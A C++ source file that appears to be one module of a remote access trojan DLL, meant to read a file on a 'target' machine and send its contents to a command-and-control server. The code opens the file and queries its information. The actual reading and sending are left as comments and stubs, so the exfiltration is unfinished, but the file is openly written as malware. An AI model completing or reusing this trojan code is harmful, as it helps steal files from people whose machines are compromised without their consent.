// Patrick Sacchet
// Verison 1.0.
// RAT-Dll-GetFile.cpp : Defines functionality for performing a file get on target, i.e., retrieving a buffer of file contents and sending it back to our C2 server

#include "RAT-Dll-GetFile.h"
#include "RAT-Dll-Connect.h"


INT performGetFile(__in const char* filePath, __out char* fileBytes)
{
	INT status = SUCCESS;
	HANDLE hFile;
	DWORD dwBytesRead = 0;
	CHAR msgBuf[DEFAULT_BUF_LEN];
	BY_HANDLE_FILE_INFORMATION lpFileInformation;


	hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("RAT-Dll-GetFile::performGetFile - Failure from CreateFileA (INVALID_HANDLE_VALUE)");
		status = FAILURE;
		goto cleanup;
	}

	// Get file details first prior to reading it so we can get the whole size of the file 
	if (GetFileInformationByHandle(hFile, &lpFileInformation))
	{

		// Now note the size and read the file 

		// status = ReadFile();

		// allocate for fileBytes as needed according to file size 


	}
	// Failed to get file info 
	else
	{
		sprintf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from GetFileInformationByHandle %d\n", GetLastError());
		OutputDebugStringA(msgBuf);
		status = GetLastError();
		goto cleanup;
	}



	// will get filesize and allocate this buffer ourselves 
	// hFile = CreateFileA();

cleanup:
	return status;
}